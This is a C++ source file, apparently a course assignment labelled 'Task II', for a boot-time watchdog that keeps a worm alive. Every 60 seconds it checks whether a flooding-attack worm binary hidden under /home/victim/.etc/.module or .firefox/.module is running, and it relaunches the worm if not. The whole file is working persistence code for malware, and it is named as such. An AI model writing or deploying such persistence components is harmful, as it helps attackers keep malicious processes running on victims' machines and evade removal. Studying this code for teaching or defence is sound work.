/**
 * Task II
 *
 * This program should be executed whenever the computer is booted. It checks
 * whether the worm is running or not for every 60 seconds. This program itself
 * does not perform any payload.
 *
 * The first worm should be put at var LOCATION_A while another tentative put at
 * var LOCATION_B
 */

#include <stdlib.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <unistd.h>
#include <iostream>
#include <string>

#define MINUTE 60 * 1000 * 1000
#define LOCATION_A "/home/victim/.etc/.module/Flooding_Attack"
#define LOCATION_B "/home/victim/.firefox/.module/Flooding_Attack"

std::string path_bin;

// Queires if the program is running by given PID.
bool isWormRunning(pid_t pid) {
    int status;
    return waitpid(pid, &status, WNOHANG) == 0;
}

// Queries any location the worm binary is repalced. If no bin file exists,
// return empty string.
std::string isWormDistributed() {
    struct stat buffer;
    if (stat(LOCATION_A, &buffer) == 0) {
        return LOCATION_A;
    }
    if (stat(LOCATION_B, &buffer) == 0) {
        return LOCATION_B;
    }
    return "";
}

// Executes the worm placed at given location. Returns the PID of the executed
// worm.
pid_t runWorm(std::string& loc) {
    pid_t pid = fork();
    if (pid == 0) {
        // Children
        execl(loc.c_str(), "Flood Attack", NULL);
        exit(0);
    }
    return pid;
}

int main() {
    std::cout << "Timer starts." << std::endl;
    pid_t pid = -1;
    while (1) {
        std::cout << "Checking the worm with PID " << pid << " ." << std::endl;
        if (pid < 0 || !isWormRunning(pid)) {
            std::cout << "Worm not running. Trying to execute the worm."
                      << std::endl;
            std::string path = isWormDistributed();
            if (path == "") {
                std::cout << "Failed to execute the worm." << std::endl;
                break;
            }
            pid = runWorm(path);
            if (pid < 0) {
                std::cout << "Failed to execute the worm." << std::endl;
                break;
            }
            std::cout << "Worm executed. PID " << pid << " ." << std::endl;
        } else {
            std::cout << "Worm running." << std::endl;
        }
        usleep(MINUTE);
    }
    std::cout << "Timer terminated." << std::endl;
    return -1;  // should not end
}